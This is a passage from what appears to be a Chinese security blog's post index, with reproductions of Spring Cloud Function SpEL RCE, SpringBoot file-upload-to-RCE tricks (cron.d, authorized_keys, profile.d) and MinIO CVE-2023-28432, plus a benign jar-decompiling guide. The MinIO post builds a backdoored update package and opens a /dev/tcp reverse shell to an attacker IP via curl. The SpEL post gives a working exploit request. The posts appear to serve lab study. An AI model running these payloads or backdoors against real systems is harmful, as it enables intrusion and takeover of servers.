class=\"line\">java -jar ./target/function-sample-pojo-2.0.0.RELEASE.jar</span><br></pre></td></tr></table></figure>\n<p><img src=\"40-iNlD6QLMzbytc1n1BECzBAJfn0p9cg-aiS66ltyE.png\" alt=\"image\"></p>\n<h1 id><a href=\"#\" class=\"headerlink\" title></a></h1><figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">find . -name &quot;*.java&quot;|xargs -I % cat %|grep -Eo &#x27;&quot;([^&quot; \\.\\/=&gt;\\|,:\\&#125;\\+\\)&#x27;&quot;&#x27;&quot;&#x27;]&#123;8,&#125;)&quot;&#x27;|sort -u|sed &#x27;s/&quot;//g&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">functionRouter</span><br><span class=\"line\">uppercase</span><br><span class=\"line\">lowercase</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p><img src=\"o_aHMocsoKZrpFQ9yw_ZXQ1QnNMEWHIdEdniRN-Lbic.png\" alt=\"image\"></p>\n<h2 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h2><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /functionRouter HTTP/1.1</span><br><span class=\"line\">Host: 172.16.16.127:8080</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 3</span><br><span class=\"line\">spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">sec</span><br></pre></td></tr></table></figure>\n<p><img src=\"SOTqhFjVV3MdophtDQZCOQVkrmAEgyesmRTN0cJ3B-o.png\" alt=\"image\"></p>\n<p><img src=\"EKtM0GAkORFMLK_YrVtp7NrJ4QVVerxooP6Fk3l0IbY.png\" alt=\"image\"></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","RCE","spel"]},{"title":"springboot框架的文件上传导致的RCE","url":"/2023/02/20/springboot%E6%A1%86%E6%9E%B6%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4%E7%9A%84RCE/","content":"<h1 id=\"springboot框架的文件上传导致的RCE\"><a href=\"#springboot框架的文件上传导致的RCE\" class=\"headerlink\" title=\"springboot框架的文件上传导致的RCE\"></a>springboot框架的文件上传导致的RCE</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>我们都知道springboot默认是不会解析jsp的，需要引入相对应的依赖才行。但这种以jar包启动的项目存在的任意文件上传就真的没有什么危害了吗？还是说只能上传个html文件进行存储型的XSS攻击而已？显然不是，假如我们上传的文件，路径是可控的，也就是说可以通过..&#x2F;..&#x2F;..&#x2F;来控制文件在服务器上存放的位置，那么这时候我们可能有以下的利用姿势，从而提升漏洞危害性。</p>\n<h2 id=\"方法一-定时任务\"><a href=\"#方法一-定时任务\" class=\"headerlink\" title=\"方法一(定时任务)\"></a>方法一(定时任务)</h2><p>定时任务的路径有</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">/var/spool/cron/root   <span class=\"comment\">#文件要以用户名称存在</span></span><br><span class=\"line\">/etc/cron.d            <span class=\"comment\">#这里的文件（任意名称和后缀），也会被轮询加载执行</span></span><br><span class=\"line\">/etc/cron.daily/       <span class=\"comment\">#下面的任务都是每天6：25 执行</span></span><br><span class=\"line\">/etc/cron.weekly/      <span class=\"comment\">#下面的任务都是每周日 6：47 执行</span></span><br><span class=\"line\">/etc/cron.monthly/     <span class=\"comment\">#下面的任务都是每月1号 6：52 执行</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0</span>    <span class=\"number\">12</span>   *   *   *   mail dmtsai -s <span class=\"string\">&quot;at 12:00&quot;</span> &lt; /home/dmtsai/.bashrc</span><br><span class=\"line\"><span class=\"comment\">#分  时   日   月  周  |《==============命令行=======================》|</span></span><br></pre></td></tr></table></figure>\n<p>条件：</p>\n<ul>\n<li>上传路径可以控制</li>\n<li>后缀名称不限</li>\n</ul>\n<p>系统任务目录需要指定执行的用户名才可以</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root<span class=\"meta\">@minion2</span> cron.d]# cat ntptime </span><br><span class=\"line\">*/<span class=\"number\">2</span> * * * * /sbin/ntpdate ntp.aliyun.com</span><br><span class=\"line\">*/<span class=\"number\">1</span> * * * * root /bin/echo <span class=\"string\">&quot;hello&quot;</span> &gt;/root/<span class=\"number\">1.</span>txt</span><br></pre></td></tr></table></figure>\n<p>因为在&#x2F;etc&#x2F;cron.d这个目录下，任意后缀的文件都可以执行，我们创建一个每分钟执行一次的定时任务；并且把结果输出到&#x2F;tmp下的haha文件中（注意这里要添加一个用户名）</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">*/<span class=\"number\">1</span> * * * * root ls &gt;/tmp/haha <span class=\"number\">2</span>&gt;&amp;<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"bU3jKrv9hVH0midBkLtCNWB7eN464X4HgGgMPV07MwE.png\" alt=\"image\"></p>\n<p>cron 守护进程在后台静默地检查 &#x2F;etc&#x2F;crontab 文件和&#x2F;var&#x2F;spool&#x2F;cron 及 &#x2F;etc&#x2F;cron.d*&#x2F; 目录。</p>\n<h2 id=\"方法二（替换私钥）\"><a href=\"#方法二（替换私钥）\" class=\"headerlink\" title=\"方法二（替换私钥）\"></a>方法二（替换私钥）</h2><p>条件：</p>\n<ul>\n<li>路径可控</li>\n<li>可以上传私钥</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">../../../../../../../root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n<h2 id=\"方法三（终端自启动）\"><a href=\"#方法三（终端自启动）\" class=\"headerlink\" title=\"方法三（终端自启动）\"></a>方法三（终端自启动）</h2><p>条件：</p>\n<ul>\n<li>路径可以控制</li>\n<li>.sh后缀未被禁止</li>\n</ul>\n<p>打开profile文件分析得知，用户打开bash窗口就会执行&#x2F;etc&#x2F;profile.d目录下所有.sh文件</p>\n<p>cat &#x2F;etc&#x2F;profile</p>\n<p><img src=\"tw-G7X0ckGwkYRW9uzgAtFbquGXN7vxYzwpBGQypdaU.png\" alt=\"image\"></p>\n<p>在目录下写一个rce.sh的文件</p>\n<p><img src=\"1XOPDdmTgQGlyrtlX6vhMx5CUFxwwvBAnyJsO7Uou9Q.png\" alt=\"image\"></p>\n<p>内容如下：</p>\n<p>执行一下ls命令并且把内容输出到tmp目录下的rcels文件中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">echo `ls` &gt;&gt; /tmp/rcels</span><br></pre></td></tr></table></figure>\n<p>打开一个新的窗口或终端；查看效果，成功执行了命令</p>\n<p><img src=\"eX7ZT8TpQsWJFMx1RCqjTU18N11B3DlCavzwxQnXldw.png\" alt=\"image\"></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","RCE","文件上传","springboot"]},{"title":"中间件MinIO信息泄露导致的RCE（CVE-2023-28432）","url":"/2023/04/11/%E4%B8%AD%E9%97%B4%E4%BB%B6MinIO%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%AF%BC%E8%87%B4%E7%9A%84RCE%EF%BC%88CVE-2023-28432%EF%BC%89/","content":"<h1 id=\"中间件MinIO信息泄露导致的RCE（CVE-2023-28432）\"><a href=\"#中间件MinIO信息泄露导致的RCE（CVE-2023-28432）\" class=\"headerlink\" title=\"中间件MinIO信息泄露导致的RCE（CVE-2023-28432）\"></a>中间件MinIO信息泄露导致的RCE（CVE-2023-28432）</h1><h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>Minio 是一个基于Go语言的对象存储服务。它实现了大部分亚马逊S3云存储服务接口，可以看做是是S3的开源版本，非常适合于存储大容量非结构化的数据，例如图片、视频、日志文件、备份数据和容器&#x2F;虚拟机镜像等。MinIO verify接口存在敏感信息泄漏漏洞，攻击者通过构造特殊URL地址，读取系统敏感信息。</p>\n<p>默认账号密码是：minioadmin&#x2F;minioadmin</p>\n<h2 id=\"漏洞利用方式\"><a href=\"#漏洞利用方式\" class=\"headerlink\" title=\"漏洞利用方式\"></a>漏洞利用方式</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">版本号检测：</span><br><span class=\"line\"><span class=\"number\">1.</span>http请求：GET /api/v1/check-version</span><br><span class=\"line\"><span class=\"number\">2.</span>HTTP响应版本小于RELEASE<span class=\"number\">.2023</span>-<span class=\"number\">03</span>-20T20-<span class=\"number\">16</span>-18Z则存在漏洞。</span><br><span class=\"line\">信息泄漏：</span><br><span class=\"line\">POST /minio/bootstrap/v1/verify HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">RCE思路：</span><br><span class=\"line\">利用泄露的账号密码和MinIO客户端登录并设置MinIO的升级访问URL，因为MinIO对于升级包的sha256sum校验失效，所以能够有损的RCE。</span><br><span class=\"line\"><span class=\"number\">1.</span>设置升级url：mc alias set myminio http:<span class=\"comment\">//ip:9000  user_R3s3arcm pwd_R3s3arcm</span></span><br><span class=\"line\"><span class=\"number\">2.</span>触发更新：mc admin update myminio -y</span><br></pre></td></tr></table></figure>\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>使用vulhub的docker搭建服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://hub.nuaa.cf/vulhub/vulhub/tree/master/minio/CVE-2023-28432</span><br><span class=\"line\">下载docker-compose.yml之后进行启动</span><br><span class=\"line\">docker-compose up -d</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"q2eW7vxAoq_cQOdUJICMTGS1ORd-tY_QrBjnRAv5BaU.png\" alt=\"image\"></p>\n<p>10.211.55.9:9001</p>\n<p><img src=\"5pGs45rYXfI4IIX_yrg8j6UNU3WuSTHSxti-qfHS0BA.png\" alt=\"image\"></p>\n<p>非官方的镜像，没有公钥，不用绕过。</p>\n<p><img src=\"Wf6XMp8cRyDvRBpncc5dq1Q5eO2yvCdGIrlt9DxeFQ8.png\" alt=\"image\"></p>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p>POC</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST /minio/bootstrap/v1/verify HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">10.211</span><span class=\"number\">.55</span><span class=\"number\">.9</span>:<span class=\"number\">9000</span></span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">5.0</span> (Macintosh; Intel Mac OS X <span class=\"number\">10_15_7</span>) AppleWebKit/<span class=\"number\">537.36</span> (KHTML, like Gecko) wwlocal/<span class=\"number\">2.6</span><span class=\"number\">.760000</span> Chrome/<span class=\"number\">96.0</span><span class=\"number\">.4664</span><span class=\"number\">.174</span> Electron/<span class=\"number\">16.2</span><span class=\"number\">.2</span> Safari/<span class=\"number\">537.36</span> wxwork/<span class=\"number\">2.6</span><span class=\"number\">.760000</span> wwlocal/<span class=\"number\">1.0</span> wxworklocal/<span class=\"number\">2.6</span><span class=\"number\">.760000</span> WXDrive/<span class=\"number\">2.0</span> MicroMessenger/<span class=\"number\">6.3</span><span class=\"number\">.22</span></span><br><span class=\"line\">Accept: *<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"comment\">Connection: close</span></span><br><span class=\"line\"><span class=\"comment\">Referer: http://10.211.55.9:9001/login</span></span><br><span class=\"line\"><span class=\"comment\">Content-Type: application/x-www-form-urlencoded</span></span><br><span class=\"line\"><span class=\"comment\">Content-Length: 0</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">//注意需要请求访问的是9000端口</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"e-2dWrOorzFeE48zhbEp2YA5xvBZm7Un53JSQPkZAfM.png\" alt=\"image\"></p>\n<p>得到了账号密码 minioadmin&#x2F;minioadmin-vulhub</p>\n<p><img src=\"LbUTfRDHNx9wGc1cy0rETLHUY4hOKeR_nafy8m1cv7w.png\" alt=\"image\"></p>\n<h2 id=\"安装mc客户端\"><a href=\"#安装mc客户端\" class=\"headerlink\" title=\"安装mc客户端\"></a>安装mc客户端</h2><p>折腾了一下mac端的mac客户端，没成功之后，就改使用docker版本的mc客户端</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 容器安装</span></span><br><span class=\"line\">$ docker pull minio/mc</span><br><span class=\"line\"><span class=\"comment\">#直接执行命令</span></span><br><span class=\"line\">$ docker run minio/mc <span class=\"built_in\">ls</span> play</span><br><span class=\"line\"><span class=\"comment\">#进入容器执行命令</span></span><br><span class=\"line\">docker run -it --entrypoint=/bin/sh minio/mc</span><br></pre></td></tr></table></figure>\n<p>连接尝试，添加实例，添加成功。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mc config host add miniode1 http://10.211.55.9:9000 minioadmin minioadmin-vulhub</span><br></pre></td></tr></table></figure>\n<p><img src=\"SKuMBd-r3II1gPEl0Y5NGOB7kVMZdhQwHlboVBA7Zo8.png\" alt=\"image\"></p>\n<h2 id=\"RCE复现\"><a href=\"#RCE复现\" class=\"headerlink\" title=\"RCE复现\"></a>RCE复现</h2><p>大佬修改好的后门版本下载地址：<a href=\"https://github.com/AbelChe/evil_minio\">https://github.com/AbelChe/evil_minio</a></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//编译</span></span><br><span class=\"line\">CGO_ENABLED=<span class=\"number\">0</span> GOOS=linux GOARCH=amd64 <span class=\"keyword\">go</span> build -ldflags=<span class=\"string\">&quot;-s -w&quot;</span> -trimpath</span><br><span class=\"line\"><span class=\"comment\">//重命名</span></span><br><span class=\"line\">mv minio minio.RELEASE<span class=\"number\">.2023</span><span class=\"number\">-03</span><span class=\"number\">-22</span>T06<span class=\"number\">-36</span><span class=\"number\">-24</span>Z</span><br><span class=\"line\"><span class=\"comment\">//shasum校验</span></span><br><span class=\"line\">shasum -a <span class=\"number\">256</span> minio.RELEASE<span class=\"number\">.2023</span><span class=\"number\">-03</span><span class=\"number\">-22</span>T06<span class=\"number\">-36</span><span class=\"number\">-24</span>Z &gt; minio.RELEASE<span class=\"number\">.2023</span><span class=\"number\">-03</span><span class=\"number\">-22</span>T06<span class=\"number\">-36</span><span class=\"number\">-24</span>Z.sha256sum</span><br><span class=\"line\">启动http服务</span><br><span class=\"line\">python3 -m http.server <span class=\"number\">18090</span></span><br></pre></td></tr></table></figure>\n<p>编译报错了</p>\n<p><img src=\"GVYHArrAGvKaZ0a7KbpLPzhyMmPfnPQZw40GGa96_9g.png\" alt=\"image\"></p>\n<p>解决：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">go</span> env -w GOPROXY=https:<span class=\"comment\">//goproxy.cn,direct​</span></span><br><span class=\"line\"><span class=\"keyword\">go</span> clean -modcache</span><br><span class=\"line\"><span class=\"keyword\">go</span> mod tidy</span><br></pre></td></tr></table></figure>\n<p>执行完成之后，再继续执行最上面的命令进行编译。再次遇到问题，golang版本太低，本机的版本是1.7.5；提示需要1.8版本和1.19.1；查了一下官方信息，需要1.19以上版本的go环境运行。</p>\n<p><img src=\"-_tQ0X7YlAQJFTENqAd5L9IMVkTrkhtmnvjXJrq2AGI.png\" alt=\"image\"></p>\n<p><img src=\"UpHVOBVem_Un5dTrwt7kKm0ANLzAz6HCy1DzlYvlw5o.png\" alt=\"image\"></p>\n<p>升级golang的版本；下载 golang 版本升级工具</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone https:<span class=\"comment\">//github.com/udhos/update-golang</span></span><br></pre></td></tr></table></figure>\n<p>执行升级命令</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd update-golang</span><br><span class=\"line\">sudo RELEASE=<span class=\"number\">1.19</span><span class=\"number\">.1</span> ./update-golang.sh</span><br><span class=\"line\">说明： RELEASE=<span class=\"number\">1.19</span><span class=\"number\">.1</span> 指定 golang 需要升级的版本</span><br><span class=\"line\"><span class=\"keyword\">go</span> version</span><br></pre></td></tr></table></figure>\n<p><img src=\"DoYjRem3iwT7z6d5waP-vRX_qRP36cqxUWMG0j7oeNo.png\" alt=\"image\"></p>\n<p>继续编译，编译成功。并且重命名一下</p>\n<p><img src=\"8auTGLP7uGQT2TE1nfImmBEsAqfL3G7vLl-mWF7y6xk.png\" alt=\"image\"></p>\n<p>校验一下sha256</p>\n<p><img src=\"t8kBmm5v5PopSPahxZpjQWtHYkWqpjbGZDNnQC0xgig.png\" alt=\"image\"></p>\n<p>RCE</p>\n<p>为了直观点，我们可以创建一个桶（此操作非必须）</p>\n<p><img src=\"eJfffU4hVF-Fx63iFlbuOJUNWhRLvXx-FH6LC7lCanQ.png\" alt=\"image\"></p>\n<p>使用mc客户端进行操作</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#添加 MinIO服务案例</span></span><br><span class=\"line\">mc config host add docker_minio1 http://ip:9000 用户名 密码</span><br><span class=\"line\"><span class=\"comment\">#添加 MinIO服务</span></span><br><span class=\"line\">mc config host add miniode1 http://10.211.55.9:9000 minioadmin minioadmin-vulhub</span><br><span class=\"line\"><span class=\"comment\">#ls命令 - 列出对象(可以不执行这一步)</span></span><br><span class=\"line\">mc <span class=\"built_in\">ls</span> miniode1</span><br><span class=\"line\"><span class=\"comment\">#下载更新包更新</span></span><br><span class=\"line\">mc admin update miniode1 http://10.211.55.2:18090/minio.RELEASE.2023-03-22T06-36-24Z.<span class=\"built_in\">sha256sum</span> -y</span><br></pre></td></tr></table></figure>\n<p>成功升级</p>\n<p><img src=\"2hR9Gze1yooxkC5Ls11wGKbHEpTJjSlchAkozHRHJmI.png\" alt=\"image\"></p>\n<p>尝试执行命令</p>\n<p>踩坑：（这里一开始一直使用9001端口访问，一直都没成功，以为自己的升级包有问题）</p>\n<p>最后使用9000端口进行请求，成功执行了命令</p>\n<p><img src=\"hsqPypsa1S9iwGdVMarn-5inxAjps0n1o691yaGfSvg.png\" alt=\"image\"></p>\n<p>反弹shell</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">/bin/sh -i &gt;&amp; /dev/tcp/10.211.55.2/4567 0&gt;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\">curl <span class=\"string\">&#x27;http://10.211.55.9:9000/?alive=%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.211.55.2%2F4567%200%3E%261&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"co4RpHjVQfJE12ctkaE-0qL71WZg5tVJwylcO4kQLlo.png\" alt=\"image\"></p>\n<p>功能依然正常，未受到影响</p>\n<p><img src=\"Q4ZS-PAwMS_7jhB22lxQFDKrxREsrt-kcllgjvSmz3o.png\" alt=\"image\"></p>\n<p>总结：</p>\n<ul>\n<li>环境搭建过程遇到了较多的问题：主要是当时没有科学上网，拉取国外资源的时候太慢了，会有一些莫名其妙的报错。</li>\n<li>golang的版本：其次是golang环境的版本，太久没更新本地golang环境，导致无法正常编译。</li>\n<li>验证是否成功</li>\n</ul>\n","categories":["漏洞复现"],"tags":["漏洞复现","MinIO","未授权访问"]},{"title":"反编译jar的class文件","url":"/2023/05/24/%E5%8F%8D%E7%BC%96%E8%AF%91jar%E7%9A%84class%E6%96%87%E4%BB%B6/","content":"<h1 id=\"反编译jar的class文件\"><a href=\"#反编译jar的class文件\" class=\"headerlink\" title=\"反编译jar的class文件\"></a>反编译jar的class文件</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>我们在进行代码审计的时候，很多时候我们只能拿到jar或者war之类的部署包。直接解压jar包是class文件，虽然放在idea里面也可以解析查看内容，但是不能够编辑修改等。下面我们学习一下怎么反编译成Java文件（前提是jar没有被做过特殊处理）</p>\n<h2 id=\"JAD\"><a href=\"#JAD\" class=\"headerlink\" title=\"JAD\"></a>JAD</h2><p>下载：<a href=\"https://varaneckas.com/jad/\">https://varaneckas.com/jad/</a></p>\n<p><img src=\"IGE3ni3weokZ_81xTPlc9mrW-bO9lWvfbgKKCFDyrrw.png\" alt=\"image\"></p>\n<p>把classes文件放在文件夹后，放在jad同一个文件夹下面，执行命令</p>\n<p><img src=\"m1i4Z8zBmkyYZd6JT77HXsxd-M-PXJrYppymT4O3Bq4.png\" alt=\"image\"></p>\n<p>执行命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">jad -o -r -s java -d decodeJava classes/**/*.class</span><br></pre></td></tr></table></figure>\n<p>反编译之后的Java文件就在decodeJava文件夹下</p>\n<p><img src=\"q8PErNaVz61BotU6ZDgFRtm6xaKqdCNm6Tlrn7KUtoU.png\" alt=\"image\"></p>\n<h2 id=\"Luyten\"><a href=\"#Luyten\" class=\"headerlink\" title=\"Luyten\"></a>Luyten</h2><p>下载：<a href=\"https://github.com/deathmarine/Luyten\">https://github.com/deathmarine/Luyten</a></p>\n<p>设置编码（中文乱码）</p>\n<p>需进行下面的配置，反编译后的中文才能正常显示。否则，是 Unicode 编码</p>\n<p><img src=\"oOmRWwPGO37Vs8Xo2ixZ5aviaaTBh9r66yvV-EWJvhI.png\" alt=\"image\"></p>\n<p>选择要反编译的 jar 文件</p>\n<p><img src=\"J2MQBCrfwXjGdr4u19NVwi7i1htJnucgCRNw9cLstnM.png\" alt=\"image\"></p>\n<p>生成 &amp; 保存反编译后的 java 文件</p>\n<p><img src=\"nluVCzITuz6TSHXjgxW_TMUMcur6z1DBI_UdxHv3i5I.png\" alt=\"image\"></p>\n<h2 id=\"IDEA自带的插件\"><a href=\"#IDEA自带的插件\" class=\"headerlink\" title=\"IDEA自带的插件\"></a>IDEA自带的插件</h2><h3 id=\"进行反编译\"><a href=\"#进行反编译\" class=\"headerlink\" title=\"进行反编译\"></a>进行反编译</h3><p>利用Idea直接查看引入的jar包，或者利用idea反编译插件，将jar包变成java文件。</p>\n<p>Mac</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -cp <span class=\"string\">&quot;/Applications/IntelliJ IDEA.app/Contents/plugins/java-decompiler/lib/java-decompiler.jar&quot;</span> org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=<span class=\"literal\">true</span> *.jar <span class=\"string\">&quot;/Users/***&quot;</span></span><br></pre></td></tr></table></figure>\n<p>Window</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">I:/java15/openjdk-<span class=\"number\">15</span>-36_windows-x64_bin/jdk-<span class=\"number\">15</span>/bin/java.exe -cp <span class=\"string\">&quot;I:/idea/IntelliJ IDEA 2020.1/plugins/java-decompiler/lib/java-decompiler.jar&quot;</span> org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=<span class=\"literal\">true</span> *.jar <span class=\"string\">&quot;./result&quot;</span></span><br></pre></td></tr></table></figure>\n<p>参数说明</p>\n<ul>\n<li>idea自带的反编译插件我位置——  &#x2F;Applications&#x2F;IntelliJ IDEA.app&#x2F;Contents&#x2F;plugins&#x2F;java-decompiler&#x2F;lib&#x2F;java-decompiler.jar</li>\n<li>需要反编译的jar包——*.jar</li>\n<li>结果输出位置——“&#x2F;Users&#x2F;***“</li>\n</ul>\n<p>结果输出后还是一个jar文件，直接解压就可以，里面是.java格式的</p>\n<h3 id=\"碰到错误处理方式\"><a href=\"#碰到错误处理方式\" class=\"headerlink\" title=\"碰到错误处理方式\"></a>碰到错误处理方式</h3><ul>\n<li>我猜测该问题原因是idea自带jvm是11版本的，然后这个包是使用jdk11编译的</li>\n<li>运行的时候用的是自己的环境，52就代表了1.8版本，低版本编译在高版本可以兼容运行，但是高版本的编译在低版本就无法运行</li>\n</ul>\n<p>换成高版本的jdk解决</p>\n<p>class version对应的版本</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Java <span class=\"number\">1.0</span> <span class=\"number\">45.0</span></span><br><span class=\"line\">Java <span class=\"number\">1.1</span> <span class=\"number\">45.3</span></span><br><span class=\"line\">Java <span class=\"number\">1.2</span> <span class=\"number\">46.0</span></span><br><span class=\"line\">Java <span class=\"number\">1.3</span> <span class=\"number\">47.0</span></span><br><span class=\"line\">Java <span class=\"number\">1.4</span> <span class=\"number\">48.0</span></span><br><span class=\"line\">Java <span class=\"number\">5</span>\t<span class=\"number\">49.0</span></span><br><span class=\"line\">Java <span class=\"number\">6</span>\t<span class=\"number\">50.0</span></span><br><span class=\"line\">Java <span class=\"number\">7</span>\t<span class=\"number\">51.0</span></span><br><span class=\"line\">Java <span class=\"number\">8</span>\t<span class=\"number\">52.0</span></span><br><span class=\"line\">Java <span class=\"number\">9</span>\t<span class=\"number\">53.0</span></span><br><span class=\"line\">Java <span class=\"number\">10</span>\t<span class=\"number\">54.0</span></span><br><span class=\"line\">Java <span class=\"number\">11</span>\t<span class=\"number\">55.0</span></span><br><span class=\"line\">Java <span class=\"number\">12</span>\t<span class=\"number\">56.0</span></span><br><span class=\"line\">Java <span class=\"number\">13</span>\t<span class=\"number\">57.0</span></span><br><span class=\"line\">Java <span class=\"number\">14</span>\t<span class=\"number\">58.0</span></span><br><span class=\"line\">Java <span class=\"number\">15</span>\t<span class=\"number\">59.0</span></span><br><span class=\"line\">Java <span class=\"number\">16</span>\t<span class=\"number\">60.0</span></span><br><span class=\"line\">Java <span class=\"number\">17</span>\t<span class=\"number\">61.0</span></span><br><span class=\"line\">Java <span class=\"number\">18</span>\t<span class=\"number\">62.0</span></span><br><span class=\"line\">Java <span class=\"number\">19</span>\t<span class=\"number\">63.0</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"批量反编译\"><a href=\"#批量反编译\" class=\"headerlink\" title=\"批量反编译\"></a>批量反编译</h3><p>Mac</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> z in *.jar;</span><br><span class=\"line\"><span class=\"keyword\">do</span> /Users/java15/jdk-<span class=\"number\">15.0</span><span class=\"number\">.2</span>.jdk/Contents/Home/bin/java -cp <span class=\"string\">&quot;/Applications/IntelliJ IDEA.app/Contents/plugins/java-decompiler/lib/java-decompiler.jar&quot;</span> org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=<span class=\"literal\">true</span> $z <span class=\"string\">&quot;/Users/lib&quot;</span>;</span><br><span class=\"line\">done</span><br></pre></td></tr></table></figure>\n<p>Window（poweershell）</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">foreach ($i in Get-ChildItem  -Include *.jar -Recurse) &#123; I:/java15/openjdk-<span class=\"number\">15</span>-36_windows-x64_bin/jdk-<span class=\"number\">15</span>/bin/java.exe -cp <span class=\"string\">&quot;I:/idea/IntelliJ IDEA 2020.1/plugins/java-decompiler/lib/java-decompiler.jar&quot;</span> org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=<span class=\"literal\">true</span> $i <span class=\"string\">&quot;./result&quot;</span> &#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"批量解压\"><a href=\"#批量解压\" class=\"headerlink\" title=\"批量解压\"></a>批量解压</h3><p>Mac</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> f in *.zip; <span class=\"keyword\">do</span> unzip $f; done</span><br></pre></td></tr></table></figure>\n<p>Windows</p>\n<p>直接使用压缩软件批量</p>\n<p><img src=\"hZzQ1mflrURbU2jD19-2YVJtlkirCKiBa6HTCkHE3nY.png\" alt=\"image\"></p>\n","categories":["代码审计"],"tags":["Java","反编译","代码审计"]},{"title":"内网180的.NET拿shell","url":"/2021/10/24/%E5%86%85%E7%BD%91180%E7%9A%84.NET%E6%8B%BFshell/","content":"<h1 id=\"内网180的-NET拿shell\"><a href=\"#内网180的-NET拿shell\" class=\"headerlink\" 